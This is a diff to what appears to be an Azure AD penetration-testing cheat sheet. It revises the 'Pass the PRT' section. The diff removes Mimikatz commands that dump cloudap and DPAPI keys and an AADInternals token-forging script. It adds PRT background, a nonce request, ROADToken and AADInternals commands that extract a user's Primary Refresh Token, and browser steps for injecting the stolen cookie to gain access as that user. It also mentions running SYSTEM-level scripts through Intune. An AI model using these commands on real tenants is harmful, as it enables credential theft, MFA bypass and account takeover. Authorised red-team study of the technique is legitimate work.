@@ -51,29 +51,40 @@ python \AzureADJoinedMachinePTC\Main.py --usercert <PATH TO .pfx FILE> --certpas
 #### Use psremoting to access the machine
 
 ## Pass the PRT
-#### Extract PRT, Session key (keyvalue) and Tenant ID
+- PRT is a special refresh token used for single sign-on (SSO)!
+  – It can be used to obtain access and refresh tokens to any application.
+  – Issued to a user for a specific device
+  – Valid for 90 days and is continuously renewed
+  – CloudAP SSP requests and caches PRT on a device
+  – If PRT is MFA-based (Windows Hello or Windows Account manager), then the claim is transferred to app tokens to prevent MFA challenge for every application.
+  - If we compromise an Azure AD joined (or Hybrid joined) machine, it is possible to extract PRT and other keys for a user.
+  - For Azure AD Registered machine, PRT is issued if a user has added a secondary work account to the device.
+  - Before a fix in August 2021, PRT always had MFA claims. After fixes in August 2021, PRT can currently be extracted only for the current Azure AD user (not as a local admin or any other user).
+
+#### Request a nonce
 ```
-Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
+$TenantId = "<TENANT>"
+$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
+
+$Params = @{
+"URI" = $URL
+"Method" = "POST"
+}
+$Body = @{
+"grant_type" = "srv_challenge"
+}
+$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
+$Result.Nonce
 ```
 
-#### Extract context key, clearkey and derived key
+#### Extract PRT
+- Should be run on session of the targer Azure AD User
+- https://github.com/dirkjanm/ROADtools
+- https://aadinternals.com/aadinternals/
 ```
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEY VALUE> /unprotect" "exit"'
-```
-
-#### Request access token (cookie) to all applications
-```
-Import-Module .\AADInternals.psd1
-
-$tempPRT = '<PRT>'
-while($tempPRT.Length % 4) {$tempPRT += "="}
-$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($tempPRT))
-
-$ClearKey = "<CLEARKEY>"
-$SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))
-
-New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
-```
+C:\AzAD\Tools\ROADToken.exe <nonce>
+Get-AADIntUserPRTToken
+````
 
 #### Copy the value from above command and use it with a web browser
 - Open the Browser in Incognito mode
@@ -83,7 +94,6 @@ New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
 - Mark HTTPOnly and Secure for the cookie
 - Visit https://login.microsoftonline.com/login.srf again and we will get access as the user!
 - Can now also access portal.azure.com
-
 
 ## Intune
 - a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
